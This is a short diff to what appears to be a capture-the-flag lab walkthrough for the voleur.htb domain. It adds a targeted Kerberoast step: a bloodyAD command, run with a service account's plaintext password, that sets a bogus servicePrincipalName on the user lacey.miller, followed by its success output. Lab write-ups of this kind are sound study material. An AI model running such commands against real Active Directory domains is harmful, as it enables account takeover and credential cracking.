@@ -296,5 +296,8 @@ Ill perform the same attack but on `lacey.miller` this time
 
 # Targeted Kerberoast on `lacey.miller`
 
-
+```python
+faketime -f +8h bloodyAD -k --host dc.voleur.htb -d voleur.htb -u svc_ldap -p 'M1XyC9pW7qT5Vn' set object 'lacey.miller' servicePrincipalName -v 'http/hacked'   
+[+] lacey.miller's servicePrincipalName has been updated
+```
 
